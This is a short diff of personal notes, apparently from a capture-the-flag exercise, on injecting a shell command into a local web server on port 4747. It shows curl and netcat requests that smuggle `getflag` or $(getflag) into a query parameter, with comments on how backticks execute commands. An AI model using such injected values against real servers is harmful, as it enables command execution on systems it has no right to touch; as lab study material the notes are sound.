@@ -12,4 +12,8 @@ curl 'localhost:4747?x=`getflag`'
 
 # find port (listeend and inside the script) -> put getflag instead x into server
 # \ - for ecraning
-# ´´ - the backtick allows you to assign the output of a shell command to a variable
+# `` - the backtick works as exec or system
+
+
+# nc localhost 4747
+# GET /?x=$(getflag)
